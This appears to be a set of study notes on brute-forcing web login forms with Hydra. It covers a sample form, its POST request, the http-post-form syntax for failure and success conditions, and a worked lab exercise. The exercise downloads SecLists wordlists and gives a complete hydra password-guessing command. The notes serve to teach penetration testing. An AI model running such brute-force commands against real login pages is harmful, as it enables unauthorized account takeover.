** Basic Login Form Example
```shell-session
<form action="/login" method="post">
  <label for="username">Username:</label>
  <input type="text" id="username" name="username"><br><br>
  <label for="password">Password:</label>
  <input type="password" id="password" name="password"><br><br>
  <input type="submit" value="Submit">
</form>
```
This send a POST request to the /login endpoint on the server
```shell-session
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=john&password=secret123
```


## http-post-form
```shell-session
hydra [options] target http-post-form "path:params:condition_string"
```

** Failed attempt
```shell-session
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
```
- F indicates the failed attempt message (could be Invalid username or password, etc.)

** Successful attempt
```shell-session
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
```
- S indicates the success message (302 for successful login and redirect, Dashboard appearing on page, etc.)

** Use the inspect tool to find parameters and the network tool to see POST request

** Use a proxy when possible (BURP, ZAP)

## Constructing the param string for Hydra
- Form parameters: ^USER^ and ^PASS^ will be replaced with words from wordlist
- Additional fields: CSRF tokens
- Success Condition

```shell-session
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```


Exercise
- The login displays "Invalid credentials" on a failed attempt
- Request is being sent to '/' meaning the root endpoint
- The form data is 'username' and 'password'
Therefore, the param string will be "/:username=^USER^&password=^PASS^:F=Invalid credentials"
